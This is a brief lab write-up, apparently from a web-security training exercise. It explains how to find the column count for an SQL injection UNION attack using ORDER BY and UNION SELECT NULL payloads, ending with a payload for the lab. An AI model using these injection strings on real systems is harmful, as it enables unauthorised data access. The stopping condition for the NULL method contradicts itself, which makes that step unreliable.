 There are exactly two ways to determine the number of columns required in an SQL injection UNION attack
 
  1. The first one involves injecting a series of ORDER BY queries until an error occurs. The last value before the error would indicate the number of columns. For example:
  
          ' ORDER BY 1--
          ' ORDER BY 2--
          ' ORDER BY 3-- 
          and so on until an error occurs 
  2.  The second one (most effective in my opinion), would involve submitting a series of UNION SELECT payloads with a number of NULL values. 
			No error = number of NULL matches the number of columns
      ```
		' UNION SELECT NULL--
		' UNION SELECT NULL,NULL--
		' UNION SELECT NULL,NULL,NULL--
		until the error occurs
      ```
      
      Payload for this lab:
      ```
      ' UNION SELECT NULL,NULL,NULL--+
      
      or
      
      ' ORDER BY 3--+
      ```
      
      
